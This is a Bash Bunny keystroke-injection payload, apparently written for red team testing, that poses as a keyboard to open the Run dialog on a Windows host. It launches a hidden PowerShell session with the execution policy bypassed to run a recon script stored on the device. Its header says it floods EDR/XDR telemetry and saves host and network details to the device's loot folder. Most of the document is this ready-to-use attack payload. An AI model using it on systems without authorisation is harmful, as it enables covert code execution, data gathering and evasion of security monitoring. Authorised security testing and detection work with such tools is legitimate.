#!/bin/bash

#============= EDR/XDR-TELEMETRY-FLOODER =====================
# Author: turkkat284-ui
# date: 15.09.2026 7:55 PM
# description:
# EDR/XDR Telemetry Flooder & Recon
#
# A dual-purpose Bash Bunny payload designed for Red/Purple Team operations and security testing.
#
# This payload simulates adversary discovery techniques to evaluate EDR/XDR detection responsiveness and SOC alert handling. While saturating telemetry logs with rapid, benign discovery calls (whoami, netstat, reg query), it simultaneously extracts host configuration details and network state directly to the Bash Bunny's internal loot storage.
#
# Features:
# - Telemetry Saturation: Triggers common EDR/XDR behavioral detection rules to test alert prioritization and analyst alert fatigue.
# - Automated Recon Exfiltration: Dynamically locates the Bash Bunny storage volume (BASHBUNNY) on the target host and logs command outputs directly to a timestamped file in the /loot directory.
# - Stealthy Execution: Leverages HID emulation to launch a backgrounded, non-interactive PowerShell session with execution policy bypass.
#
# Category Alignment:
# - Primary: exfiltration (Gathers and saves host telemetry directly to onboard storage)
# - Secondary: recon / Incident_Response (Executes rapid system and network enumeration)

ATTACKMODE HID STORAGE

LED ATTACK
QUACK DELAY 2000

QUACK GUI r
QUACK DELAY 500

QUACK STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "D:\payloads\switch1\core\noise-marker.ps1"
QUACK ENTER

LED FINISH
